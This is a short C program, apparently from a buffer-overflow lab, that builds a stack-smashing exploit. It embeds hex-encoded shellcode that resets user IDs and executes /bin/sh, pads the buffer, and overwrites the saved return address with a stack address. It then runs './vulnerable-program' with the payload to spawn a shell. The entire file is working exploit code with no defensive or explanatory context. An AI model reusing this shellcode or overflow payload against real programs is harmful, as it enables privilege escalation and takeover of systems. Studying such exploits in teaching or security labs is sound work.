#include <string.h>
#include <stdio.h>

int main(int argc, char **argv) {
	char string[40];

	char exploit[] =
		"\x48\x31\xc0\xb0\x71\x48\x31\xFF\x48\x31" // 0-9
		"\xF6\xCD\x80\xEB\x1B\x5F\x48\x31\xC0\x88" // 10-19
		"\x47\x07\x48\x89\x7F\x08\x48\x89\x47\x10" // 20-29 
		"\xb0\x3B\x48\x8D\x77\x08\x48\x8D\x57\x10" // 30-39
		"\xCD\x80\xE8\xE0\xFF\xFF\xFF\x2F\x62\x69" // 40-49
		"\x6E\x2F\x73\x68\x90\x90" // 50-55;
		"AAAAAAAA" // 56-...
	;
	
	if (argc < 2) execl(argv[0], "vulnerable-program", exploit, 0);

	*((long long int*)(exploit + 56)) = &string;

	execl("./vulnerable-program", "vulnerable-program", exploit, 0);

	return 0;
}
